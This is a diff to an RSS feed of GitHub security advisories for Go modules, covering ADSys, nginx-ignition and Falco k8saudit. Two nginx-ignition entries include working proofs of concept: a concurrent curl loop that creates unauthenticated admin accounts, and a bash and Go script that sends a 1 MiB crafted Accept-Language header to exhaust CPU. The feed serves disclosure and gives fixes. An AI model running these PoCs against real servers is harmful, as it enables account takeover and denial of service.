@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-09-21T19:22:48.047Z</updated>
+    <updated>2026-09-21T22:39:14.960Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -11,6 +11,615 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[github.com/ubuntu/adsys] Canonical ADSys Uses a Less Trusted Source]]></title>
+        <id>https://github.com/advisories/GHSA-crm4-q7v4-c2r2</id>
+        <link href="https://github.com/advisories/GHSA-crm4-q7v4-c2r2"/>
+        <updated>2026-09-21T22:27:11.000Z</updated>
+        <content type="html"><![CDATA[<p>An issue was discovered in Canonical ADSys upstream versions through v0.16.2. During Active Directory Certificate Services (AD CS) certificate auto-enrollment via the vendored Samba client script (internal/policies/certificate/python/vendor_samba/gp/gp_cert_auto_enroll_ext.py), ADSys utilizes a plaintext HTTP connection (http://) instead of a secure HTTPS connection (https://) to request the CA certificate from the Active Directory Certificate Services server (GetCACert). An unauthenticated network attacker positioned between the managed Ubuntu host and the configured AD CS CA hostname can conduct a Man-in-the-Middle (MITM) attack. By intercepting the plaintext HTTP request, the attacker can supply an arbitrary, attacker-controlled Root CA certificate. Because the system automatically accepts this certificate and registers it into the local system trust store via update-ca-certificates, this results in system-wide trust store poisoning. Consequently, TLS clients utilizing the operating system trust store on the affected machine will accept rogue certificates for arbitrary domains, enabling persistent decryption and interception of subsequent TLS connections. This issue is resolved in version v0.16.3.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-12249">https://nvd.nist.gov/vuln/detail/CVE-2026-12249</a></li>
+<li><a href="https://github.com/ubuntu/adsys/commit/8b1939f96d3827b4426eb06c1ced5bf317b0a99d">https://github.com/ubuntu/adsys/commit/8b1939f96d3827b4426eb06c1ced5bf317b0a99d</a></li>
+<li><a href="https://ubuntu.com/security/CVE-2026-12249">https://ubuntu.com/security/CVE-2026-12249</a></li>
+<li><a href="https://github.com/ubuntu/adsys/releases/tag/v0.16.3">https://github.com/ubuntu/adsys/releases/tag/v0.16.3</a></li>
+<li><a href="https://github.com/advisories/GHSA-crm4-q7v4-c2r2">https://github.com/advisories/GHSA-crm4-q7v4-c2r2</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-crm4-q7v4-c2r2</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-06-22T18:34:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lucasdillmann/nginx-ignition]  nginx ignition has Unauthenticated Admin Account Creation via Onboarding Race Condition]]></title>
+        <id>https://github.com/advisories/GHSA-pxcx-fv34-x9p5</id>
+        <link href="https://github.com/advisories/GHSA-pxcx-fv34-x9p5"/>
+        <updated>2026-09-21T21:54:43.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>POST /api/users/onboarding/finish</code> is registered as <strong>anonymous (unauthenticated)</strong> and creates a user with <strong>full ReadWrite admin permissions</strong>. Because the handler uses a check-then-act (TOCTOU) pattern between the "onboarding already completed?" check and the user-creation write, with no atomic guard, a remote unauthenticated attacker who can reach an instance in its pre-onboarding state can create an administrator account for themselves — and concurrent requests can create multiple admin accounts in a single race.</p>
+<h2 id="affected-component">Affected component</h2>
+<ul>
+<li>Endpoint: <code>POST /api/users/onboarding/finish</code></li>
+<li>Route registration: <code>api/user/routes.go:49</code> → <code>authorizer.AllowAnonymous(http.MethodPost, "/api/users/onboarding/finish")</code></li>
+<li>Handler: <code>api/user/onboarding_finish_handler.go</code></li>
+</ul>
+<h2 id="technical-details">Technical details</h2>
+<p>The route is explicitly allowed without authentication:</p>
+<pre><code class="language-go">// api/user/routes.go:48-49
+authorizer.AllowAnonymous(http.MethodGet,  "/api/users/onboarding/status")
+authorizer.AllowAnonymous(http.MethodPost, "/api/users/onboarding/finish")
+</code></pre>
+<p>The handler reads the onboarding state, returns 403 if already finished, and otherwise creates a user with every permission set to ReadWrite:</p>
+<pre><code class="language-go">// api/user/onboarding_finish_handler.go
+func (h onboardingFinishHandler) handle(ctx *gin.Context) {
+    alreadyFinished, err := h.commands.OnboardingCompleted(ctx.Request.Context())  // (1) CHECK
+    if err != nil { panic(err) }
+    if alreadyFinished {
+        ctx.Status(http.StatusForbidden)
+        return
+    }
+
+    requestPayload := &amp;userRequestDTO{}
+    if err = ctx.BindJSON(requestPayload); err != nil { panic(err) }
+
+    domainModel := converter.Wrap(ctx.Request.Context(), toDomain, requestPayload)
+    domainModel.ID = uuid.New()
+    domainModel.Enabled = true
+    domainModel.Permissions = user.Permissions{        // full admin
+        Hosts:        user.ReadWriteAccessLevel,
+        Streams:      user.ReadWriteAccessLevel,
+        Certificates: user.ReadWriteAccessLevel,
+        Integrations: user.ReadWriteAccessLevel,
+        AccessLists:  user.ReadWriteAccessLevel,
+        Settings:     user.ReadWriteAccessLevel,
+        Users:        user.ReadWriteAccessLevel,
+        NginxServer:  user.ReadWriteAccessLevel,
+        Caches:       user.ReadWriteAccessLevel,
+        // ...all remaining permissions ReadWrite/ReadOnly
+    }
+
+    if err = h.commands.Save(ctx.Request.Context(), domainModel, nil); err != nil {  // (2) ACT
+        panic(err)
+    }
+    // ...authenticates and returns a JWT for the new admin
+}
+</code></pre>
+<p>The gap between <strong>(1)</strong> <code>OnboardingCompleted()</code> and <strong>(2)</strong> <code>Save()</code> is not protected by a lock, transaction, or unique constraint. Two or more requests can each pass the <code>alreadyFinished == false</code> check before any of them commits, so every racing request proceeds to create an admin user and receive a valid admin JWT.</p>
+<h2 id="preconditions-stated-honestly">Preconditions (stated honestly)</h2>
+<p>This is exploitable when the instance is in a <strong>pre-onboarding state</strong>:</p>
+<ol>
+<li><strong>Fresh deployment</strong> — the time window between the service coming online and the legitimate operator completing onboarding. During this window any unauthenticated party who can reach the instance can register the first/an additional admin. The race lets an attacker slip an admin account in <em>alongside</em> the operator's, so the operator's onboarding appears to succeed normally while the attacker silently holds admin.</li>
+<li><strong>State reset</strong> — if onboarding state can return to "not completed" (e.g. all users removed), the endpoint reopens and becomes a repeatable unauthenticated admin-creation primitive.</li>
+</ol>
+<p>The single-request path is a setup-window exposure; the <strong>race</strong> is what turns "first legitimate admin" into "attacker also gets admin," and what allows multiple admin accounts to be minted from one burst.</p>
+<h2 id="proof-of-concept">Proof of concept</h2>
+<p>Against an instance that has not yet completed onboarding:</p>
+<pre><code class="language-bash"># Fire concurrent onboarding-finish requests; multiple admin accounts are created,
+# each returning a valid admin JWT, despite the single-admin intent.
+for i in $(seq 1 20); do
+  curl -s -X POST http://TARGET/api/users/onboarding/finish \
+    -H 'Content-Type: application/json' \
+    -d '{"username":"attacker'"$i"'","password":"P@ssw0rd123!"}' \
+    -o /dev/null -w "%{http_code}\n" &amp;
+done
+wait
+# Multiple 200 responses (each with a login token) instead of exactly one 200 + N×403.
+</code></pre>
+<p>Each <code>200</code> response body contains a <code>userLoginResponseDTO</code> with a JWT granting full admin access (Hosts/Streams/Certificates/Settings/Users/NginxServer/AccessLists/Caches = ReadWrite). The attacker then has complete control of the nginx-ignition instance and the nginx server it manages.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Unauthenticated administrative account takeover</strong> of a fresh (or reset) instance.</li>
+<li>Full admin enables every downstream capability: creating hosts/routes, editing global and per-route nginx configuration, managing access lists and certificates, and controlling the nginx server process. (The config surface is itself injectable — see the related nginx-configuration-injection issues — so admin here is a path to SSRF / arbitrary nginx directives.)</li>
+<li>The TOCTOU race additionally allows minting multiple admin accounts from a single concurrent burst, aiding persistence/stealth.</li>
+</ul>
+<h2 id="remediation">Remediation</h2>
+<ol>
+<li>Make onboarding completion atomic: enforce a database-level unique constraint (e.g. "at most one onboarding user" / single-row guard) so concurrent creates collide, or wrap the check-and-create in a single transaction / mutex.</li>
+<li>Re-check <code>OnboardingCompleted()</code> inside the same transaction that performs the insert, and abort on conflict.</li>
+<li>Consider requiring a one-time setup token (printed to server logs / env at first boot) for the initial admin creation, eliminating the unauthenticated window entirely.</li>
+</ol>
+<hr>
+<p><em>Finding ID: GM-4607</em></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-pxcx-fv34-x9p5">https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-pxcx-fv34-x9p5</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61628">https://nvd.nist.gov/vuln/detail/CVE-2026-61628</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/pull/131">https://github.com/lucasdillmann/nginx-ignition/pull/131</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/commit/0586b4e55ab780676d3553a2592979dfa2fb0183">https://github.com/lucasdillmann/nginx-ignition/commit/0586b4e55ab780676d3553a2592979dfa2fb0183</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.41.1">https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.41.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-pxcx-fv34-x9p5">https://github.com/advisories/GHSA-pxcx-fv34-x9p5</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-pxcx-fv34-x9p5</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-21T21:54:42.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lucasdillmann/nginx-ignition] nginx ignition has  ParseAcceptLanguage `_` separator bypass that enables ~75x CPU amplification via Accept-Language header in i18nMiddleware]]></title>
+        <id>https://github.com/advisories/GHSA-jr34-h97m-9hpx</id>
+        <link href="https://github.com/advisories/GHSA-jr34-h97m-9hpx"/>
+        <updated>2026-09-21T21:49:33.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The gin i18n middleware in nginx-ignition's API server runs in front of every HTTP request and calls <code>golang.org/x/text/language.ParseAcceptLanguage</code> on the raw <code>Accept-Language</code> header without imposing any size or shape filter. The underlying parser has quadratic-time behaviour on long lists of malformed language tags. The CVE-2022-32149 guard that golang.org/x/text added in v0.3.8 caps the number of <code>-</code> characters in the input at 1000, but it does not cap <code>_</code> characters even though the parser's internal scanner aliases <code>_</code> to <code>-</code> before parsing. A single unauthenticated GET request with an <code>Accept-Language</code> header built out of <code>_</code> separators burns about 2.4 seconds of server CPU on the host running nginx-ignition; ten concurrent attackers saturate a ten-core box for the duration of the attack while consuming ~10 MiB/s of upstream bandwidth.</p>
+<h3 id="affected-versions">Affected versions</h3>
+<p><code>dillmann.com.br/nginx-ignition</code> v2.40.0 and (per code inspection of <code>main</code>) earlier 2.x versions whose <code>api/common/server/i18n.go</code> middleware routes the <code>Accept-Language</code> header through <code>language.ParseAcceptLanguage</code> without imposing its own size or character filter. Verified on:</p>
+<ul>
+<li>the official <code>dillmann/nginx-ignition:latest</code> Docker image at v2.40.0 (E2E below)</li>
+<li><code>main</code> at commit <code>faef4c99442b329cfa4ee8879bdba41c22866a18</code> by reading <code>api/common/server/i18n.go</code> (the middleware is unchanged)</li>
+</ul>
+<h3 id="privilege-required">Privilege required</h3>
+<p>Unauthenticated. The middleware is registered on the global gin router that serves both the login page and the unauthenticated <code>/api/health</code> style endpoints. Anyone who can reach the HTTP listener (port 8090 by default) is in scope.</p>
+<h3 id="vulnerable-code">Vulnerable code</h3>
+<p><a href="https://github.com/lucasdillmann/nginx-ignition/blob/faef4c99442b329cfa4ee8879bdba41c22866a18/api/common/server/i18n.go"><code>api/common/server/i18n.go</code></a> (blob SHA <code>faef4c99442b329cfa4ee8879bdba41c22866a18</code>):</p>
+<pre><code class="language-go">func i18nMiddleware(commands i18n.Commands) gin.HandlerFunc {
+    return func(ginCtx *gin.Context) {
+        lang := commands.DefaultLanguage()
+
+        langHeader := ginCtx.GetHeader("Accept-Language")
+        tags, _, err := language.ParseAcceptLanguage(langHeader)
+        if err == nil &amp;&amp; len(tags) &gt; 0 {
+            for _, tag := range tags {
+                if commands.Supports(tag) {
+                    lang = tag
+                    break
+                }
+            }
+        }
+
+        //nolint:staticcheck
+        updatedCtx := context.WithValue(ginCtx.Request.Context(), i18n.ContextKey, lang)
+        ginCtx.Request = ginCtx.Request.WithContext(updatedCtx)
+        ginCtx.Set(i18n.ContextKey, lang)
+        ginCtx.Next()
+    }
+}
+</code></pre>
+<p><code>ginCtx.GetHeader("Accept-Language")</code> is the unfiltered HTTP header. Go's default <code>net/http</code> <code>MaxHeaderBytes</code> is <code>1 &lt;&lt; 20</code> = 1 MiB and nginx-ignition does not override it, so the parser is allowed to receive up to a megabyte of attacker-controlled data.</p>
+<p>CVE-2022-32149 hardened <code>ParseAcceptLanguage</code> by counting <code>-</code> characters and rejecting inputs with more than 1000 of them. The guard does not count <code>_</code> characters even though the scanner converts <code>_</code> to <code>-</code> at parse time (<a href="https://github.com/golang/text/blob/v0.28.0/internal/language/parse.go"><code>golang.org/x/text/internal/language/parse.go</code></a>). A 1 MiB header full of 9-character <code>_abcdefghi</code> tokens contains zero <code>-</code> characters, passes the guard, and then drives the scanner into the O(N²) <code>gobble</code> path.</p>
+<h3 id="how-accept-language-reaches-parseacceptlanguage">How <code>Accept-Language</code> reaches <code>ParseAcceptLanguage</code></h3>
+<p>Every HTTP request that hits the nginx-ignition API server passes through <code>i18nMiddleware</code> (registered as a global gin middleware). The middleware sequence is:</p>
+<ol>
+<li>The request enters <code>i18nMiddleware</code>.</li>
+<li><code>ginCtx.GetHeader("Accept-Language")</code> returns the full attacker-supplied header value.</li>
+<li><code>language.ParseAcceptLanguage(langHeader)</code> runs unfiltered.</li>
+</ol>
+<p>No size or character-class filter is applied between (2) and (3). The middleware runs for every gin handler, including unauthenticated paths like the root URL and <code>/api/health</code> (which returns 404 but still completes the middleware chain).</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Single-line bash reproducer that crafts the malicious header and times one request against a fresh <code>dillmann/nginx-ignition:latest</code> container:</p>
+<pre><code class="language-bash">docker run -d --name ngi --rm -p 18090:8090 dillmann/nginx-ignition:latest
+sleep 5
+
+PAYLOAD="en$(python3 -c 'print("_abcdefghi" * 100000, end="")')"
+echo "header size = ${#PAYLOAD} bytes"
+
+curl -sS -o /dev/null \
+  -w 'http=%{http_code} t=%{time_total}\n' \
+  -H "Accept-Language: ${PAYLOAD}" \
+  http://127.0.0.1:18090/api/health
+</code></pre>
+<p>Each 9-character <code>_abcdefghi</code> token has length 9, which fails the scanner's <code>len &lt;= 8</code> tag-length check at <code>golang.org/x/text/internal/language/parse.go</code> and triggers a <code>gobble</code> call that <code>runtime.memmove</code>s the entire remaining buffer. With N invalid tokens the total bytes moved by <code>gobble</code> is O(N²).</p>
+<h3 id="end-to-end-reproduction-against-dillmannnginx-ignitionlatest-at-v2400">End-to-end reproduction (against <code>dillmann/nginx-ignition:latest</code> at v2.40.0)</h3>
+<p>A Go driver <code>poc.go</code> boots the container, sends a 1 MiB <code>Accept-Language</code> value once with <code>-</code> (CVE-2022-32149 guard fires) and once with <code>_</code> (guard bypassed):</p>
+<pre><code class="language-go">// poc.go
+package main
+
+import (
+    "fmt"
+    "io"
+    "net"
+    "net/http"
+    "strings"
+    "time"
+)
+
+const targetURL = "http://127.0.0.1:18090/api/health"
+
+func buildPayload(sep string, targetBytes int) string {
+    const tok = "abcdefghi"
+    var b strings.Builder
+    b.Grow(targetBytes + 16)
+    b.WriteString("en")
+    for b.Len()+1+len(tok) &lt;= targetBytes {
+        b.WriteString(sep)
+        b.WriteString(tok)
+    }
+    return b.String()
+}
+
+func send(label, header string) {
+    client := &amp;http.Client{
+        Timeout: 60 * time.Second,
+        Transport: &amp;http.Transport{
+            DisableKeepAlives: true,
+            DialContext: (&amp;net.Dialer{Timeout: 5 * time.Second}).DialContext,
+        },
+    }
+    req, _ := http.NewRequest("GET", targetURL, nil)
+    if header != "" {
+        req.Header.Set("Accept-Language", header)
+    }
+    t0 := time.Now()
+    resp, err := client.Do(req)
+    dt := time.Since(t0)
+    if err != nil {
+        fmt.Printf("  %-32s ERR after %v: %v\n", label, dt, err)
+        return
+    }
+    _, _ = io.Copy(io.Discard, resp.Body)
+    resp.Body.Close()
+    fmt.Printf("  %-32s header=%d B  '_'=%d  '-'=%d  status=%d  t=%v\n",
+        label, len(header),
+        strings.Count(header, "_"), strings.Count(header, "-"),
+        resp.StatusCode, dt)
+}
+
+func main() {
+    send("warm-up", "")
+    send("baseline (no header)", "")
+    send("baseline (1 short tag)", "en-US")
+    send("guard-fires ('-' x 1MiB)", buildPayload("-", 1&lt;&lt;20))
+    send("attack ('_' x 1MiB)",     buildPayload("_", 1&lt;&lt;20))
+    send("attack repeat 2",          buildPayload("_", 1&lt;&lt;20))
+    send("attack repeat 3",          buildPayload("_", 1&lt;&lt;20))
+}
+</code></pre>
+<p>Captured run output (Apple M1 Pro, darwin/arm64, Go 1.26.1, the official <code>dillmann/nginx-ignition:latest</code> image at v2.40.0):</p>
+<pre><code>E2E: golang/x/text ParseAcceptLanguage '_' bypass through
+lucasdillmann/nginx-ignition 2.40.0 i18nMiddleware at
+api/common/server/i18n.go.
+
+Target: http://127.0.0.1:18090/api/health   payload=1048576 B
+
+  warm-up                                      header=0 B  '_'=0  '-'=0  status=404  t=10.336041ms
+
+--- measurements (single request each) ---
+  baseline (no header)                         header=0 B  '_'=0  '-'=0  status=404  t=4.211583ms
+  baseline (1 short tag)                       header=5 B  '_'=0  '-'=1  status=404  t=3.276416ms
+  guard-fires control ('-' x payload)          header=1048572 B  '_'=0  '-'=104857  status=404  t=31.683792ms
+  attack ('_' x payload)                       header=1048572 B  '_'=104857  '-'=0  status=404  t=2.429408875s
+  attack repeat 2                              header=1048572 B  '_'=104857  '-'=0  status=404  t=3.589948166s
+  attack repeat 3                              header=1048572 B  '_'=104857  '-'=0  status=404  t=2.415860875s
+</code></pre>
+<p>Interpretation:</p>
+<table>
+<thead>
+<tr>
+<th>Request</th>
+<th>Header bytes</th>
+<th>Server time</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>no header / short tag</td>
+<td>0 - 5</td>
+<td>3 - 11 ms</td>
+</tr>
+<tr>
+<td>1 MiB <code>-</code> separators (CVE-2022-32149 guard fires)</td>
+<td>1 MiB</td>
+<td>32 ms</td>
+</tr>
+<tr>
+<td>1 MiB <code>_</code> separators (guard bypassed)</td>
+<td>1 MiB</td>
+<td>2.4 - 3.6 s</td>
+</tr>
+</tbody></table>
+<p>The <code>-</code> control proves that the existing CVE-2022-32149 guard does still work on the canonical separator: a 1 MiB <code>-</code> payload returns in 32 ms because the parser short-circuits with <code>ErrTagListTooLarge</code>. The <code>_</code> attack returns 404 (the same as the baseline) from the same endpoint but consumes ~2.4-3.6 s of server CPU because the guard did not fire and the quadratic scanner ran to completion. The amplification factor at the application boundary is ~75-110x (32 ms guard-fires vs 2.4-3.6 s attack on the same 1 MiB header).</p>
+<h3 id="impact">Impact</h3>
+<ul>
+<li>One unauthenticated client can pin one CPU core for ~2.4 seconds per 1 MiB request to any URL (the middleware runs even on 404 paths).</li>
+<li>Ten concurrent attackers using ~10 MiB/s of upstream bandwidth pin a 10-core nginx-ignition instance indefinitely.</li>
+<li>The 4xx/5xx status of the eventual response does not matter — the middleware runs before route resolution, so the CPU cost is paid whether the URL exists or not.</li>
+<li>Self-hosted nginx-ignition instances exposed to the public internet (a documented deployment pattern in the project's README) are exposed.</li>
+</ul>
+<h3 id="suggested-fix">Suggested fix</h3>
+<p>Apply the size / character-class filter inside the middleware before reaching <code>language.ParseAcceptLanguage</code>. The smallest change that preserves the existing behaviour for legitimate Accept-Language headers is to count <code>_</code> alongside <code>-</code> and short-circuit when the total exceeds a small ceiling:</p>
+<pre><code class="language-go">// api/common/server/i18n.go
+const maxAcceptLanguageSeparators = 32 // real browsers send &lt; 10
+
+func i18nMiddleware(commands i18n.Commands) gin.HandlerFunc {
+    return func(ginCtx *gin.Context) {
+        lang := commands.DefaultLanguage()
+
+        langHeader := ginCtx.GetHeader("Accept-Language")
+        if strings.Count(langHeader, "-")+strings.Count(langHeader, "_") &gt; maxAcceptLanguageSeparators {
+            // Refuse to call into the BCP 47 parser with absurd input.
+            langHeader = ""
+        }
+        tags, _, err := language.ParseAcceptLanguage(langHeader)
+        if err == nil &amp;&amp; len(tags) &gt; 0 {
+            for _, tag := range tags {
+                if commands.Supports(tag) {
+                    lang = tag
+                    break
+                }
+            }
+        }
+
+        //nolint:staticcheck
+        updatedCtx := context.WithValue(ginCtx.Request.Context(), i18n.ContextKey, lang)
+        ginCtx.Request = ginCtx.Request.WithContext(updatedCtx)
+        ginCtx.Set(i18n.ContextKey, lang)
+        ginCtx.Next()
+    }
+}
+</code></pre>
+<p>A real Accept-Language header from a browser contains under 10 separators, so a ceiling of 32 leaves plenty of headroom while making the quadratic blow-up impossible.</p>
+<p>The underlying issue is in <code>golang.org/x/text/language</code>. A future upstream fix is the right long-term solution; the change above is defensive-in-depth at the middleware that consumes attacker input.</p>
+<h3 id="credit">Credit</h3>
+<p>Reported by tonghuaroot.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-jr34-h97m-9hpx">https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-jr34-h97m-9hpx</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61629">https://nvd.nist.gov/vuln/detail/CVE-2026-61629</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/pull/125">https://github.com/lucasdillmann/nginx-ignition/pull/125</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/commit/0c988fc1277c7d291725e8373313f8486fa1b31a">https://github.com/lucasdillmann/nginx-ignition/commit/0c988fc1277c7d291725e8373313f8486fa1b31a</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/commit/cbaf0fc16ed873f7178a2ca9b0d00a696e44b485">https://github.com/lucasdillmann/nginx-ignition/commit/cbaf0fc16ed873f7178a2ca9b0d00a696e44b485</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.40.1">https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.40.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-jr34-h97m-9hpx">https://github.com/advisories/GHSA-jr34-h97m-9hpx</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-jr34-h97m-9hpx</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-09-21T21:49:03.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/lucasdillmann/nginx-ignition] nginx ignition has TOTP Reuse During Validity Window]]></title>
+        <id>https://github.com/advisories/GHSA-hf33-q6cf-c66f</id>
+        <link href="https://github.com/advisories/GHSA-hf33-q6cf-c66f"/>
+        <updated>2026-09-21T21:47:41.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>Any user that has enabled the OTP 2FA can have their TOTP reused during the standard 30 second validity window.</p>
+<h3 id="details">Details</h3>
+<p>The <a href="https://github.com/pquerna/otp">https://github.com/pquerna/otp</a> package <a href="https://github.com/pquerna/otp/issues/61">doesn't include</a> checking for already used TOTPs within its the validity window. This requires each application that uses the package to implement their own method of tracking and verifying that codes can't be reused.</p>
+<p>Section 6.5.1 within the <a href="https://github.com/OWASP/ASVS/blob/master/5.0/en/0x15-V6-Authentication.md">Authentication</a> section of the OWASP ASVS recommends multiple checks, some of which involving TOTPs:</p>
+<blockquote>
+<p>Verify that lookup secrets, out-of-band authentication requests or codes, and time-based one-time passwords (TOTPs) are only successfully usable once.</p>
+</blockquote>
+<p>The OWASP WSTG also references this as one of their <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_Multi-Factor_Authentication">checks</a> to look for:</p>
+<blockquote>
+<p>Can the OTPs be used more than once?</p>
+</blockquote>
+<h3 id="poc">PoC</h3>
+<p><a href="https://github.com/user-attachments/assets/86a43374-39bf-4d61-8f6d-5cc440c99a1e">https://github.com/user-attachments/assets/86a43374-39bf-4d61-8f6d-5cc440c99a1e</a></p>
+<h3 id="impact">Impact</h3>
+<p>Any user who uses 2FA could be impacted if their traffic is able to be captured, they're phished/social engineered, or other methods of attack. This disrupts one layer of the defense-in-depth model surrounding 2FA.</p>
+<h3 id="similar-cves">Similar CVEs</h3>
+<ul>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6014">CVE-2025-6014</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-55003">CVE-2025-55003</a></li>
+<li><a href="https://github.com/go-vikunja/vikunja/security/advisories/GHSA-p747-qc5p-773r">CVE-2026-33473</a></li>
+</ul>
+<h3 id="remediation">Remediation</h3>
+<p>Store a deny-list of TOTP codes for their validity windows and check submitted codes against it to ensure none are being reused. After their validity window has closed, the 2FA code can be removed from the list.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-hf33-q6cf-c66f">https://github.com/lucasdillmann/nginx-ignition/security/advisories/GHSA-hf33-q6cf-c66f</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61630">https://nvd.nist.gov/vuln/detail/CVE-2026-61630</a></li>
+<li><a href="https://github.com/pquerna/otp/issues/61">https://github.com/pquerna/otp/issues/61</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/pull/104">https://github.com/lucasdillmann/nginx-ignition/pull/104</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/commit/1cbfae0296f1b186158f5a294ec484060e00102e">https://github.com/lucasdillmann/nginx-ignition/commit/1cbfae0296f1b186158f5a294ec484060e00102e</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/commit/8d35e1eb5dd6a40fef94a45511fe08b0603af107">https://github.com/lucasdillmann/nginx-ignition/commit/8d35e1eb5dd6a40fef94a45511fe08b0603af107</a></li>
+<li><a href="https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.35.1">https://github.com/lucasdillmann/nginx-ignition/releases/tag/2.35.1</a></li>
+<li><a href="https://github.com/advisories/GHSA-hf33-q6cf-c66f">https://github.com/advisories/GHSA-hf33-q6cf-c66f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-hf33-q6cf-c66f</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-09-21T21:47:40.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/falcosecurity/plugins/plugins/k8saudit-ovh] k8saudit shipped rules do not detect privileged/sensitive settings on init or ephemeral containers]]></title>
+        <id>https://github.com/advisories/GHSA-jhjp-4c2q-xmx4</id>
+        <link href="https://github.com/advisories/GHSA-jhjp-4c2q-xmx4"/>
+        <updated>2026-09-21T21:43:55.000Z</updated>
+        <content type="html"><![CDATA[<p>The <code>k8saudit</code> plugin's per-container fields (<code>ka.req.pod.containers.*</code>) and the shipped <code>k8s_audit_rules.yaml</code> evaluated only <code>requestObject.spec.containers</code>. Security-relevant settings on a pod's <code>initContainers</code> or <code>ephemeralContainers</code> were not inspected, so the shipped <code>Create Privileged Pod</code> rule did not fire for a privileged container placed in either list.</p>
+<h3 id="impact">Impact</h3>
+<p>An actor able to create pods (the activity k8saudit is intended to audit) could run a privileged container without triggering the default <code>Create Privileged Pod</code> rule, by declaring it as an <code>initContainer</code> or <code>ephemeralContainer</code> instead of a regular container. Kubernetes runs such containers with the requested privileges, but the shipped rule did not see them. The same gap applied to other per-container security settings (capabilities, <code>allowPrivilegeEscalation</code>, <code>runAsUser</code>, etc.) and, for deployments using a customized image allowlist, to disallowed images placed in those lists.</p>
+<p>This is a detection bypass of the default k8saudit ruleset, not a direct privilege escalation, and it requires the ability to create pods. The cloud-provider variants (<code>k8saudit-eks</code>, <code>k8saudit-gke</code>, <code>k8saudit-aks</code>, <code>k8saudit-ovh</code>) embed the same extraction logic and ship the same ruleset, and were affected equally.</p>
+<p>Note: adding an ephemeral container goes through the <code>pods/ephemeralcontainers</code> subresource, so the <code>EphemeralContainers Created</code> rule still logged that event at <code>NOTICE</code>, but without any privileged/security evaluation.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>k8saudit 0.18.0</code>, and in the cloud-variant releases that depend on it — <code>k8saudit-eks 0.12.0</code>, <code>k8saudit-gke 0.9.0</code>, <code>k8saudit-aks 0.6.0</code>, <code>k8saudit-ovh 0.6.0</code> — all released on 2026-06-19.</p>
+<p>The fix (<a href="https://github.com/falcosecurity/plugins/pull/1400">falcosecurity/plugins#1400</a>, merged 2026-06-18) adds dedicated <code>ka.req.pod.initContainers.*</code> and <code>ka.req.pod.ephemeralContainers.*</code> field families and updates <code>Create Privileged Pod</code> (via a new <code>any_container_privileged</code> macro) to evaluate all three container lists.</p>
